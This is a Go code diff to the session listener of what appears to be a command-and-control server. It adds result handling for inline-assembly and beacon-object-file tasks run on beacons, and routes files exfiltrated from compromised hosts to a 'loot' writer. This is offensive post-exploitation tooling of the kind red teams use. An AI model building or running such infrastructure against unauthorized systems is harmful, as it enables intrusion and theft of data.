@@ -4,8 +4,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"net"
-	"os"
-	"path/filepath"
 	"sync"
 	"time"
 
@@ -250,6 +248,48 @@ func (sl *SessionListener) handleSession(conn net.Conn) {
 				"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskSet,
 				"output": output, "received_at": time.Now().Unix(),
 			})
+
+		case protocol.TaskInlineAssembly:
+			receivedAt := time.Now()
+			inlineResult, err := protocol.DecodeInlineAssemblyResult(plain[16:])
+			result := newInlineAssemblyResult(beaconID, hdr, inlineResult, receivedAt)
+			if err != nil {
+				result = newInlineAssemblyDecodeErrorResult(beaconID, hdr, err, receivedAt)
+			}
+			sl.store.StoreResult(result)
+			sl.store.MarkTaskDone(hdr.Label)
+			sl.hub.Publish("results", "add", inlineAssemblyResultEventPayload(result))
+			sl.notifySubscribers(beaconID, result)
+
+		case protocol.TaskBOF:
+			output, err := protocol.DecodeRunRep(plain[16:])
+			if err != nil {
+				continue
+			}
+			receivedAt := time.Now()
+			if isInlineAssemblyBOFTask(sl.store.GetTaskByLabel(hdr.Label)) {
+				result := newInlineAssemblyTextResult(beaconID, hdr, output, receivedAt)
+				sl.store.StoreResult(result)
+				sl.store.MarkTaskDone(hdr.Label)
+				sl.hub.Publish("results", "add", inlineAssemblyResultEventPayload(result))
+				sl.notifySubscribers(beaconID, result)
+				continue
+			}
+			result := &models.Result{
+				BeaconID:   beaconID,
+				Label:      hdr.Label,
+				Type:       protocol.TaskBOF,
+				Flags:      hdr.Flags,
+				Output:     output,
+				ReceivedAt: receivedAt,
+			}
+			sl.store.StoreResult(result)
+			sl.store.MarkTaskDone(hdr.Label)
+			sl.hub.Publish("results", "add", map[string]interface{}{
+				"label": result.Label, "beacon_id": beaconID, "type": protocol.TaskBOF,
+				"flags": hdr.Flags, "output": result.Output, "received_at": result.ReceivedAt.Unix(),
+			})
+			sl.notifySubscribers(beaconID, result)
 
 		default:
 			output, err := protocol.DecodeRunRep(plain[16:])
@@ -536,11 +576,7 @@ func (sl *SessionListener) handleSocksConnection(conn net.Conn, beaconID uint32)
 }
 
 func (sl *SessionListener) saveExfilFile(label uint32, filename string, data []byte) error {
-	if err := os.MkdirAll("exfil", 0755); err != nil {
-		return err
-	}
-	path := filepath.Join("exfil", fmt.Sprintf("%d_%s", label, filepath.Base(filename)))
-	return os.WriteFile(path, data, 0644)
+	return writeLootFile(label, filename, data)
 }
 
 // CloseSession closes the TCP session for a beacon without killing the beacon.
